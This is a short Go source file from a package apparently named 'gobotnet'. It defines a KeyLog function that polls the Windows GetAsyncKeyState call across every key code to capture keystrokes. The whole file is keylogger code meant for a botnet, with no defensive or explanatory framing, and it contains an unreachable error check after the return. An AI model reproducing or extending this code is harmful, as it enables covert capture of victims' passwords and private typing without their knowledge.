package gobotnet

import (
	"syscall"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

func KeyLog() (i int, err error) {
	for i := 0; i < 0xFF; i++ {
		asynch, _, _ := syscall.Syscall(procGetAsyncKeyState.Addr(), 1, uintptr(i), 0, 0)

		if asynch&0x1 == 0 {
			continue
		}

		return i, nil

		if err != nil {
			return 0, err
		}
	}

	return 0, nil
}
